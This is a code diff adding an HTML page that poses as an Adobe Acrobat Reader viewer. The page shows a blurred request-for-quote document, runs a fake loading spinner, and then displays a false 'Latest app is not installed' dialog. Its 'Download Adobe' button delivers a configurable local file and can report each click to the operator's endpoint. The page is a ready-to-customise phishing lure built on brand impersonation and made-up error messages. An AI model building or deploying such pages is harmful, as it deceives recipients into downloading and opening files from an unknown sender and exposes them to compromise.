@@ -1,0 +1,1048 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Adobe Document Viewer</title>
+    <style>
+      :root {
+        color-scheme: light;
+        --adobe-red: #ed2224;
+        --ink: #1f1f1f;
+        --muted: #666;
+        --border: #dedede;
+        --surface: #fff;
+        --background: #f6f6f6;
+        --shadow: 0 24px 80px rgba(0, 0, 0, 0.16);
+        --spin-duration: 10000ms;
+      }
+
+      * {
+        box-sizing: border-box;
+      }
+
+      body {
+        margin: 0;
+        min-height: 100vh;
+        overflow-x: hidden;
+        font-family: Arial, Helvetica, sans-serif;
+        color: var(--ink);
+        background:
+          radial-gradient(circle at top left, rgba(237, 34, 36, 0.16), transparent 34rem),
+          linear-gradient(135deg, #fff 0%, var(--background) 50%, #ededed 100%);
+      }
+
+      .page-shell {
+        position: relative;
+        display: grid;
+        min-height: 100vh;
+        place-items: center;
+        padding: 2rem;
+        isolation: isolate;
+      }
+
+      .pdf-backdrop {
+        position: absolute;
+        inset: 1vh 0;
+        z-index: -2;
+        display: grid;
+        place-items: center;
+        opacity: 0.86;
+        filter: blur(18px);
+      }
+
+      .pdf-page {
+        width: min(68vw, 46rem);
+        min-height: min(96vh, 62rem);
+        aspect-ratio: 8.5 / 11;
+        padding: clamp(1.8rem, 3vw, 2.8rem);
+        background: #fff;
+        border: 1px solid #d0d0d0;
+        border-radius: 0.4rem;
+        box-shadow: 0 32px 90px rgba(0, 0, 0, 0.22);
+      }
+
+      .pdf-toolbar {
+        display: flex;
+        gap: 0.7rem;
+        align-items: center;
+        padding-bottom: 1.3rem;
+        margin-bottom: 1.8rem;
+        border-bottom: 1px solid #ddd;
+      }
+
+      .pdf-dot {
+        width: 0.7rem;
+        height: 0.7rem;
+        background: var(--adobe-red);
+        border-radius: 50%;
+      }
+
+      .pdf-title-bar {
+        width: 45%;
+        height: 0.8rem;
+        background: #d8d8d8;
+        border-radius: 999px;
+      }
+
+      .rfq-header {
+        display: flex;
+        justify-content: space-between;
+        gap: 2rem;
+        align-items: flex-start;
+        margin-bottom: 2rem;
+      }
+
+      .rfq-company,
+      .viewer-company {
+        margin: 0 0 0.75rem;
+        color: var(--adobe-red);
+        font-size: 0.88rem;
+        font-weight: 800;
+        letter-spacing: 0.08em;
+        text-transform: uppercase;
+      }
+
+      .viewer-company {
+        margin-bottom: 1rem;
+      }
+
+      .rfq-kicker {
+        margin: 0 0 0.45rem;
+        color: var(--adobe-red);
+        font-size: 0.95rem;
+        font-weight: 800;
+        letter-spacing: 0.12em;
+        text-transform: uppercase;
+      }
+
+      .rfq-title {
+        margin: 0;
+        font-size: clamp(2.1rem, 4.8vw, 4.1rem);
+        line-height: 0.92;
+        letter-spacing: -0.08em;
+        text-transform: uppercase;
+      }
+
+      .rfq-number {
+        min-width: 10rem;
+        padding: 1rem;
+        text-align: right;
+        border: 1px solid #d8d8d8;
+        border-radius: 0.3rem;
+      }
+
+      .rfq-number strong,
+      .rfq-label {
+        display: block;
+        color: #777;
+        font-size: 0.72rem;
+        letter-spacing: 0.08em;
+        text-transform: uppercase;
+      }
+
+      .rfq-number span {
+        display: block;
+        margin-top: 0.35rem;
+        font-size: 1.25rem;
+        font-weight: 800;
+      }
+
+      .rfq-grid {
+        display: grid;
+        grid-template-columns: repeat(2, minmax(0, 1fr));
+        gap: 1.25rem;
+        margin-bottom: 1.7rem;
+      }
+
+      .rfq-block {
+        min-height: 7.5rem;
+        padding: 1rem;
+        border: 1px solid #d8d8d8;
+        border-radius: 0.3rem;
+      }
+
+      .rfq-line {
+        height: 0.65rem;
+        margin: 0.7rem 0;
+        background: #d5d5d5;
+        border-radius: 999px;
+      }
+
+      .rfq-line.short {
+        width: 48%;
+      }
+
+      .rfq-line.medium {
+        width: 72%;
+      }
+
+      .rfq-line.long {
+        width: 92%;
+      }
+
+      .rfq-table {
+        width: 100%;
+        overflow: hidden;
+        border: 1px solid #d3d3d3;
+        border-radius: 0.35rem;
+      }
+
+      .rfq-row {
+        display: grid;
+        grid-template-columns: 2.2fr 0.8fr 0.9fr 1fr;
+        gap: 0.75rem;
+        align-items: center;
+        padding: 0.9rem 1rem;
+        border-bottom: 1px solid #e0e0e0;
+      }
+
+      .rfq-row:last-child {
+        border-bottom: 0;
+      }
+
+      .rfq-row.header {
+        color: #fff;
+        font-size: 0.78rem;
+        font-weight: 800;
+        letter-spacing: 0.07em;
+        text-transform: uppercase;
+        background: #333;
+      }
+
+      .rfq-cell-line {
+        display: block;
+        height: 0.65rem;
+        background: #d2d2d2;
+        border-radius: 999px;
+      }
+
+      .rfq-total {
+        display: flex;
+        justify-content: flex-end;
+        margin-top: 1.5rem;
+      }
+
+      .rfq-total-box {
+        width: min(52%, 18rem);
+        padding: 1rem;
+        border: 1px solid #d3d3d3;
+        border-radius: 0.35rem;
+      }
+
+      .pdf-heading {
+        width: 62%;
+        height: 1.7rem;
+        margin-bottom: 1.7rem;
+        background: #bdbdbd;
+        border-radius: 999px;
+      }
+
+      .pdf-line {
+        height: 0.75rem;
+        margin: 0.9rem 0;
+        background: #dadada;
+        border-radius: 999px;
+      }
+
+      .pdf-line:nth-child(odd) {
+        width: 88%;
+      }
+
+      .pdf-line:nth-child(even) {
+        width: 72%;
+      }
+
+      .pdf-watermark {
+        display: grid;
+        width: 8rem;
+        height: 8rem;
+        margin: 2.2rem auto 1rem;
+        place-items: center;
+        color: rgba(237, 34, 36, 0.22);
+        font-size: 1.8rem;
+        font-weight: 800;
+        border: 0.35rem solid rgba(237, 34, 36, 0.18);
+        border-radius: 50%;
+      }
+
+      .card {
+        width: min(100%, 34rem);
+        padding: 2rem;
+        background: rgba(255, 255, 255, 0.96);
+        border: 1px solid var(--border);
+        border-radius: 1.5rem;
+        box-shadow: var(--shadow);
+      }
+
+      .pdf-opening-screen {
+        width: min(100%, 32rem);
+        padding: 1.6rem 1.8rem;
+        text-align: center;
+        background: rgba(255, 255, 255, 0.82);
+        border: 1px solid rgba(222, 222, 222, 0.9);
+        border-radius: 1.25rem;
+        box-shadow: var(--shadow);
+        animation: fadeIn 0.32s ease both;
+      }
+
+      .pdf-opening-screen.fade-out {
+        animation: fadeOut 0.28s ease forwards;
+      }
+
+      .pdf-opening-screen h1 {
+        margin: 0 0 0.6rem;
+        font-size: clamp(1.8rem, 5vw, 2.65rem);
+        letter-spacing: -0.04em;
+      }
+
+      .pdf-opening-screen p {
+        margin-bottom: 0;
+        color: var(--muted);
+      }
+
+      .viewer-loading {
+        display: grid;
+        width: min(100%, 20rem);
+        justify-items: center;
+        gap: 0.85rem;
+        padding: 1.5rem;
+        text-align: center;
+        animation: fadeIn 0.32s ease both;
+      }
+
+      .viewer-loading.fade-out {
+        animation: fadeOut 0.28s ease forwards;
+      }
+
+      .viewer-loading .viewer-company {
+        margin-bottom: 0;
+      }
+
+      .brand-logo {
+        display: block;
+        width: 3.6rem;
+        height: 3.6rem;
+        object-fit: contain;
+        border-radius: 0.85rem;
+        box-shadow: 0 0.75rem 1.6rem rgba(0, 0, 0, 0.12);
+      }
+
+      .viewer-loading h1 {
+        margin: 0;
+        font-size: 1.12rem;
+        letter-spacing: -0.01em;
+      }
+
+      .viewer-loading p {
+        margin: 0;
+        color: var(--muted);
+        font-size: 0.94rem;
+      }
+
+      .error-dialog {
+        width: min(calc(100vw - 2rem), 20rem);
+        padding: 1.35rem;
+        background: rgba(255, 255, 255, 0.98);
+        border: 1px solid rgba(222, 222, 222, 0.95);
+        border-radius: 0.75rem;
+        box-shadow: 0 1.5rem 4rem rgba(0, 0, 0, 0.18);
+        animation: dialogIn 0.28s ease both;
+      }
+
+      .error-dialog h2 {
+        margin: 0 0 0.65rem;
+        font-size: 1.05rem;
+        letter-spacing: -0.01em;
+      }
+
+      .error-dialog .brand-logo {
+        width: 3rem;
+        height: 3rem;
+        margin-bottom: 0.9rem;
+      }
+
+      .error-dialog p {
+        margin: 0;
+        color: #4b4b4b;
+        font-size: 0.94rem;
+        line-height: 1.45;
+      }
+
+      .dialog-actions {
+        display: flex;
+        gap: 0.6rem;
+        justify-content: flex-end;
+        margin-top: 1.2rem;
+      }
+
+      .secondary-button {
+        min-height: 2.4rem;
+        padding: 0 0.95rem;
+        color: var(--ink);
+        font: inherit;
+        font-weight: 700;
+        background: #f3f3f3;
+        border: 0;
+        border-radius: 999px;
+        cursor: pointer;
+      }
+
+      .secondary-button:focus,
+      .secondary-button:hover {
+        background: #e7e7e7;
+      }
+
+      .download-status {
+        margin: 0.9rem 0 0;
+        color: #4b4b4b;
+        font-size: 0.88rem;
+        line-height: 1.4;
+      }
+
+      h2,
+      p {
+        margin-top: 0;
+      }
+
+      h2 {
+        margin-bottom: 0.45rem;
+        font-size: 1.15rem;
+      }
+
+      p {
+        line-height: 1.55;
+      }
+
+      .document-preview {
+        position: relative;
+        display: flex;
+        gap: 1rem;
+        align-items: center;
+        margin: 2rem 0;
+        padding: 1.25rem;
+        overflow: hidden;
+        border: 1px solid var(--border);
+        border-radius: 1rem;
+        background: #fbfbfb;
+      }
+
+      .document-preview.opening-document {
+        animation: documentPulse 1.45s ease-in-out infinite;
+      }
+
+      .document-preview.opening-document::after {
+        position: absolute;
+        inset: 0;
+        content: "";
+        background: linear-gradient(110deg, transparent 0%, rgba(237, 34, 36, 0.12) 45%, transparent 70%);
+        transform: translateX(-120%);
+        animation: documentShimmer 1.5s ease-in-out infinite;
+      }
+
+      .document-icon {
+        position: relative;
+        display: grid;
+        width: 4.2rem;
+        height: 5.2rem;
+        place-items: end center;
+        padding-bottom: 0.85rem;
+        color: var(--adobe-red);
+        font-size: 0.88rem;
+        font-weight: 800;
+        border: 2px solid var(--adobe-red);
+        border-radius: 0.35rem;
+        background: #fff;
+      }
+
+      .document-preview.opening-document .document-icon {
+        transform-origin: center bottom;
+        animation: pageOpen 1.15s ease-in-out infinite;
+      }
+
+      .document-icon::before {
+        position: absolute;
+        top: -2px;
+        right: -2px;
+        width: 1.2rem;
+        height: 1.2rem;
+        content: "";
+        background:
+          linear-gradient(135deg, transparent 49%, var(--adobe-red) 50%),
+          #fff;
+        border-left: 2px solid var(--adobe-red);
+        border-bottom: 2px solid var(--adobe-red);
+      }
+
+      .document-lines {
+        flex: 1;
+      }
+
+      .document-name {
+        margin: 0 0 0.65rem;
+        font-weight: 700;
+      }
+
+      .document-lines span {
+        display: block;
+        height: 0.7rem;
+        margin: 0.55rem 0;
+        background: #e3e3e3;
+        border-radius: 999px;
+      }
+
+      .document-lines span:nth-child(2) {
+        width: 92%;
+      }
+
+      .document-lines span:nth-child(3) {
+        width: 76%;
+      }
+
+      .document-lines span:nth-child(4) {
+        width: 58%;
+      }
+
+      .status-panel {
+        display: flex;
+        gap: 1rem;
+        align-items: flex-start;
+        padding: 1.2rem;
+        border: 1px solid #f0c4c4;
+        border-radius: 1rem;
+        background: #fff8f8;
+        animation: fadeIn 0.32s ease both;
+      }
+
+      .status-panel.fade-out {
+        animation: fadeOut 0.28s ease forwards;
+      }
+
+      .spinner {
+        flex: 0 0 auto;
+        position: relative;
+        display: grid;
+        width: 4.4rem;
+        height: 4.4rem;
+        place-items: center;
+        background: rgba(255, 255, 255, 0.82);
+        border: 0;
+        border-radius: 50%;
+        box-shadow: 0 0 0 0.45rem rgba(237, 34, 36, 0.08);
+      }
+
+      .spinner::before {
+        position: absolute;
+        inset: 0;
+        content: "";
+        border: 0.35rem solid #f4c6c6;
+        border-top-color: var(--adobe-red);
+        border-radius: inherit;
+        animation: spin 0.65s linear infinite;
+      }
+
+      .spinner-logo {
+        position: relative;
+        z-index: 1;
+        width: 2.35rem;
+        height: 2.35rem;
+        object-fit: contain;
+        border-radius: 0.55rem;
+      }
+
+      .loading-dots::after {
+        display: inline-block;
+        width: 1.2em;
+        content: "";
+        animation: dots 1.1s steps(4, end) infinite;
+      }
+
+      .opening-progress {
+        position: relative;
+        width: min(100%, 19rem);
+        height: 0.45rem;
+        margin-top: 1rem;
+        overflow: hidden;
+        background: #f2cccc;
+        border-radius: 999px;
+      }
+
+      .opening-progress::before {
+        position: absolute;
+        inset: 0;
+        width: 100%;
+        content: "";
+        background: var(--adobe-red);
+        border-radius: inherit;
+        transform: scaleX(0);
+        transform-origin: left center;
+        animation: progressFill var(--spin-duration) linear forwards;
+      }
+
+      .ready-state {
+        position: fixed;
+        right: 1rem;
+        bottom: 1.5rem;
+        left: 1rem;
+        z-index: 2;
+        width: min(calc(100vw - 2rem), 38rem);
+        margin: 0 auto;
+        border-color: #efb7b7;
+        background: #fff;
+        box-shadow: 0 1rem 2.5rem rgba(0, 0, 0, 0.12);
+        animation: bottomSheetIn 0.32s ease both;
+      }
+
+      .ready-state h2 {
+        color: var(--ink);
+        font-size: 1.25rem;
+      }
+
+      .check-icon {
+        display: grid;
+        flex: 0 0 auto;
+        width: 2rem;
+        height: 2rem;
+        place-items: center;
+        color: #fff;
+        font-weight: 800;
+        background: var(--adobe-red);
+        border-radius: 50%;
+      }
+
+      .actions {
+        display: flex;
+        flex-wrap: wrap;
+        gap: 0.75rem 1rem;
+        align-items: center;
+        margin-top: 1rem;
+      }
+
+      .primary-button {
+        display: inline-flex;
+        min-height: 2.75rem;
+        align-items: center;
+        justify-content: center;
+        padding: 0 1.2rem;
+        color: #fff;
+        font: inherit;
+        font-weight: 700;
+        text-decoration: none;
+        background: var(--adobe-red);
+        border: 0;
+        border-radius: 999px;
+        cursor: pointer;
+      }
+
+      .primary-button:focus,
+      .primary-button:hover {
+        background: #c91517;
+      }
+
+      .dialog-actions .primary-button {
+        min-height: 2.4rem;
+        padding: 0 1rem;
+        font-size: 0.92rem;
+      }
+
+      .download-started {
+        margin: 1rem 0 0;
+        color: #3f6b2f;
+        font-size: 0.92rem;
+        font-weight: 700;
+      }
+
+      @keyframes spin {
+        to {
+          transform: rotate(360deg);
+        }
+      }
+
+      @keyframes progressFill {
+        to {
+          transform: scaleX(1);
+        }
+      }
+
+      @keyframes documentPulse {
+        0%,
+        100% {
+          border-color: var(--border);
+          box-shadow: 0 0 0 rgba(237, 34, 36, 0);
+          transform: translateY(0);
+        }
+
+        50% {
+          border-color: rgba(237, 34, 36, 0.45);
+          box-shadow: 0 0.85rem 1.7rem rgba(237, 34, 36, 0.1);
+          transform: translateY(-0.18rem);
+        }
+      }
+
+      @keyframes documentShimmer {
+        to {
+          transform: translateX(120%);
+        }
+      }
+
+      @keyframes pageOpen {
+        0%,
+        100% {
+          transform: translateY(0) scale(1);
+        }
+
+        50% {
+          transform: translateY(-0.18rem) scale(1.04);
+        }
+      }
+
+      @keyframes dots {
+        0% {
+          content: "";
+        }
+
+        25% {
+          content: ".";
+        }
+
+        50% {
+          content: "..";
+        }
+
+        75%,
+        100% {
+          content: "...";
+        }
+      }
+
+      @keyframes fadeIn {
+        from {
+          opacity: 0;
+          transform: translateY(0.4rem);
+        }
+
+        to {
+          opacity: 1;
+          transform: translateY(0);
+        }
+      }
+
+      @keyframes fadeOut {
+        to {
+          opacity: 0;
+          transform: translateY(-0.35rem);
+        }
+      }
+
+      @keyframes bottomSheetIn {
+        from {
+          opacity: 0;
+          transform: translateY(1rem);
+        }
+
+        to {
+          opacity: 1;
+          transform: translateY(0);
+        }
+      }
+
+      @keyframes dialogIn {
+        from {
+          opacity: 0;
+          transform: translateY(0.45rem) scale(0.96);
+        }
+
+        to {
+          opacity: 1;
+          transform: translateY(0) scale(1);
+        }
+      }
+
+      @media (max-width: 35rem) {
+        .page-shell {
+          padding: 1rem;
+        }
+
+        .pdf-backdrop {
+          inset: 4vh 0;
+          opacity: 0.34;
+        }
+
+        .pdf-page {
+          width: min(92vw, 32rem);
+          min-height: 48rem;
+          padding: 1.6rem;
+        }
+
+        .rfq-header,
+        .rfq-grid {
+          grid-template-columns: 1fr;
+        }
+
+        .rfq-header {
+          display: grid;
+        }
+
+        .rfq-number {
+          text-align: left;
+        }
+
+        .rfq-row {
+          grid-template-columns: 1.6fr 0.7fr 0.8fr 0.8fr;
+          gap: 0.55rem;
+          padding-inline: 0.7rem;
+        }
+
+        .card {
+          padding: 1.35rem;
+        }
+
+        .ready-state {
+          bottom: 1rem;
+          width: calc(100vw - 2rem);
+        }
+
+        .status-panel,
+        .document-preview {
+          align-items: flex-start;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <main class="page-shell">
+      <div class="pdf-backdrop opening-backdrop" id="pdf-backdrop" aria-hidden="true">
+        <div class="pdf-page">
+          <div class="pdf-toolbar">
+            <span class="pdf-dot"></span>
+            <span class="pdf-title-bar"></span>
+          </div>
+          <p class="rfq-company" id="rfq-company-name">Renovation Sells. RFQ</p>
+          <div class="rfq-header">
+            <div>
+              <p class="rfq-kicker">Procurement document</p>
+              <h2 class="rfq-title">Request<br>for Quote</h2>
+            </div>
+            <div class="rfq-number">
+              <strong>RFQ number</strong>
+              <span>RFQ-2026-0718</span>
+            </div>
+          </div>
+          <div class="rfq-grid">
+            <div class="rfq-block">
+              <span class="rfq-label">Requested by</span>
+              <div class="rfq-line long"></div>
+              <div class="rfq-line medium"></div>
+              <div class="rfq-line short"></div>
+            </div>
+            <div class="rfq-block">
+              <span class="rfq-label">Vendor response due</span>
+              <div class="rfq-line medium"></div>
+              <div class="rfq-line long"></div>
+              <div class="rfq-line short"></div>
+            </div>
+          </div>
+          <div class="rfq-table">
+            <div class="rfq-row header">
+              <span>Description</span>
+              <span>Qty</span>
+              <span>Unit</span>
+              <span>Total</span>
+            </div>
+            <div class="rfq-row">
+              <span class="rfq-cell-line"></span>
+              <span class="rfq-cell-line"></span>
+              <span class="rfq-cell-line"></span>
+              <span class="rfq-cell-line"></span>
+            </div>
+            <div class="rfq-row">
+              <span class="rfq-cell-line"></span>
+              <span class="rfq-cell-line"></span>
+              <span class="rfq-cell-line"></span>
+              <span class="rfq-cell-line"></span>
+            </div>
+            <div class="rfq-row">
+              <span class="rfq-cell-line"></span>
+              <span class="rfq-cell-line"></span>
+              <span class="rfq-cell-line"></span>
+              <span class="rfq-cell-line"></span>
+            </div>
+            <div class="rfq-row">
+              <span class="rfq-cell-line"></span>
+              <span class="rfq-cell-line"></span>
+              <span class="rfq-cell-line"></span>
+              <span class="rfq-cell-line"></span>
+            </div>
+          </div>
+          <div class="rfq-total">
+            <div class="rfq-total-box">
+              <span class="rfq-label">Estimated total</span>
+              <div class="rfq-line long"></div>
+              <div class="rfq-line medium"></div>
+            </div>
+          </div>
+          <div class="pdf-watermark">PDF</div>
+        </div>
+      </div>
+
+      <div id="viewer-loading" class="viewer-loading" role="status" aria-live="polite">
+        <div class="spinner" aria-hidden="true">
+          <img id="spinner-logo" class="spinner-logo" src="./adobe-logo.svg" alt="">
+        </div>
+        <p class="viewer-company">Adobe Acrobat Reader</p>
+        <h1>Opening <span id="opening-file-name">Request-for-Quote.pdf</span><span class="loading-dots" aria-hidden="true"></span></h1>
+        <p>Rendering document preview</p>
+        <div class="opening-progress" aria-hidden="true"></div>
+      </div>
+
+      <section
+        id="error-dialog"
+        class="error-dialog"
+        role="dialog"
+        aria-modal="true"
+        aria-labelledby="error-title"
+        hidden
+      >
+        <img id="dialog-logo" class="brand-logo" src="./adobe-logo.svg" alt="Adobe Acrobat Reader">
+        <h2 id="error-title">Latest app is not installed</h2>
+        <p>To view this document,<br>you need the latest Adobe app.</p>
+        <div class="dialog-actions">
+          <button id="cancel-button" class="secondary-button" type="button">Cancel</button>
+          <button
+            id="download-button"
+            class="primary-button"
+            type="button"
+          >
+            Download Adobe
+          </button>
+        </div>
+        <p id="download-status" class="download-status" aria-live="polite" hidden></p>
+      </section>
+    </main>
+
+    <!--
+      Edit these values to customize the display text, local PDF download, and optional click notification.
+      Keep downloadFileName/downloadPath pointed at a PDF document in this same directory.
+      notificationEndpoint should point to your own server-side endpoint; do not put bot tokens in this HTML.
+    -->
+    <script type="application/json" id="page-config">
+      {
+        "companyName": "Renovation Sells. RFQ",
+        "documentName": "Request-for-Quote.pdf",
+        "logoPath": "./adobe-logo.svg",
+        "downloadFileName": "rfq.pdf",
+        "downloadPath": "./rfq.pdf",
+        "loadingDelayMs": 10000,
+        "notificationEndpoint": ""
+      }
+    </script>
+
+    <script>
+      const configElement = document.querySelector("#page-config");
+      const viewerLoading = document.querySelector("#viewer-loading");
+      const errorDialog = document.querySelector("#error-dialog");
+      const rfqCompanyName = document.querySelector("#rfq-company-name");
+      const openingFileName = document.querySelector("#opening-file-name");
+      const logoImages = document.querySelectorAll("#spinner-logo, #dialog-logo");
+      const downloadButton = document.querySelector("#download-button");
+      const downloadStatus = document.querySelector("#download-status");
+      const cancelButton = document.querySelector("#cancel-button");
+
+      const config = JSON.parse(configElement.textContent);
+      const configuredCompanyName = config.companyName || "Renovation Sells. RFQ";
+      const configuredDocumentName = config.documentName || "Request-for-Quote.pdf";
+      const configuredLogoPath = config.logoPath || "./adobe-logo.svg";
+      const configuredDownloadFileName = config.downloadFileName || "rfq.pdf";
+      const configuredDownloadPath = config.downloadPath || `./${configuredDownloadFileName}`;
+      const safeDownloadFileName = configuredDownloadFileName.toLowerCase().endsWith(".pdf")
+        ? configuredDownloadFileName
+        : "rfq.pdf";
+      const safeDownloadPath = configuredDownloadPath.toLowerCase().endsWith(".pdf")
+        ? configuredDownloadPath
+        : `./${safeDownloadFileName}`;
+      const loadingDelayMs = Number(config.loadingDelayMs) || 10000;
+      const notificationEndpoint = config.notificationEndpoint || "";
+      document.documentElement.style.setProperty("--spin-duration", `${loadingDelayMs}ms`);
+
+      rfqCompanyName.textContent = configuredCompanyName;
+      openingFileName.textContent = configuredDocumentName;
+      logoImages.forEach((logoImage) => {
+        logoImage.src = configuredLogoPath;
+        logoImage.addEventListener("error", () => {
+          logoImage.hidden = true;
+        });
+      });
+
+      cancelButton.addEventListener("click", () => {
+        errorDialog.hidden = true;
+      });
+
+      const sendDownloadNotification = () => {
+        if (!notificationEndpoint) {
+          return;
+        }
+
+        fetch(notificationEndpoint, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify({
+            event: "download_button_clicked",
+            fileName: safeDownloadFileName,
+            documentName: configuredDocumentName,
+            timestamp: new Date().toISOString(),
+          }),
+          keepalive: true,
+        }).catch(() => {
+          // Notification failures should not block the user download.
+        });
+      };
+
+      downloadButton.addEventListener("click", async () => {
+        downloadStatus.hidden = false;
+        downloadStatus.textContent = "Downloading...";
+        downloadButton.disabled = true;
+        sendDownloadNotification();
+
+        try {
+          const response = await fetch(safeDownloadPath, { cache: "no-store" });
+
+          if (!response.ok) {
+            throw new Error(`Download failed with status ${response.status}`);
+          }
+
+          const fileBlob = await response.blob();
+          const objectUrl = URL.createObjectURL(fileBlob);
+          const temporaryLink = document.createElement("a");
+
+          temporaryLink.href = objectUrl;
+          temporaryLink.download = safeDownloadFileName;
+          temporaryLink.style.display = "none";
+          document.body.appendChild(temporaryLink);
+          temporaryLink.click();
+          temporaryLink.remove();
+
+          window.setTimeout(() => {
+            URL.revokeObjectURL(objectUrl);
+          }, 1000);
+
+          downloadStatus.textContent = "Download complete. Open the downloaded file to access document.";
+        } catch (error) {
+          downloadStatus.textContent = `Download could not start. Make sure ${safeDownloadFileName} is in this same directory.`;
+        } finally {
+          downloadButton.disabled = false;
+        }
+      });
+
+      window.setTimeout(() => {
+        viewerLoading.classList.add("fade-out");
+
+        window.setTimeout(() => {
+          viewerLoading.hidden = true;
+          errorDialog.hidden = false;
+        }, 280);
+      }, loadingDelayMs);
+    </script>
+  </body>
+</html>
